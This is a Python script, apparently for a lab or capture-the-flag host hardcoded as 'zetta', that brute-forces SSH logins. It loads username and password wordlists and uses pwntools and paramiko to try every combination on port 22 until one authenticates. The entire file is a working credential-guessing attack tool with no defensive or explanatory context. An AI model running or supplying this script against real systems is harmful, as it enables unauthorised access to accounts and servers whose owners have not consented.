#!/usr/bin/env python

import argparse;from pwn import *;import paramiko;import time;import pyfiglet

usr_arr=[];pass_arr=[]

parser=argparse.ArgumentParser(description="Well done, you found the help menu. ^-^")
parser.add_argument("--u",help="Add the absolute path of the user file here (/root/users.txt)");
parser.add_argument("--p",help="Add the absolute path of the password file here (/root/passwords.txt)")
args=parser.parse_args()

try:
	u_file=args.u.strip();p_file=args.p.strip()
except AttributeError:
	print("You must provide username and password files.\n")
	quit()

print("User file:",u_file,"Password file: ",p_file,"\n")

# loop through files and store lines in arrays. strip function will remove newline characters from values
usrs=open(u_file,"r")
for l in usrs:
	u=l.strip();usr_arr.append(u)
usrs.close()

passwords=open(p_file,"r")
for l in passwords:
	p=l.strip();pass_arr.append(p)
passwords.close()

# use of ASCII art in banner if user has pyfiglet module
banner=""
try:
	banner=pyfiglet.figlet_format("C-Cracks SSH Enumeration")
except:
	banner="C-Cracks SSH Enumeration"

print(banner)

# try every password for each username
i=1;x=0;u=0

while i==1:
	try:
		print("User:",usr_arr[u],"\nPassword: ",pass_arr[x])
		sh=ssh(usr_arr[u],'zetta', password=pass_arr[x],port=22)
		print("May have found valid credentials.\n")
		break

	except paramiko.ssh_exception.AuthenticationException:
		print("Nope, no access yet...\n");time.sleep(0.3)
		
		if x==len(pass_arr)-1:
			x=0
			if u==len(usr_arr)-1:
				break
			u+=1
		else:
			x+=1
			
		continue
	# repeat previous attempt if delivery failed -sleep is used for safe measure
	except:
		sleep(1);continue

	i+=1

print("Enumeration finished.\n");quit()
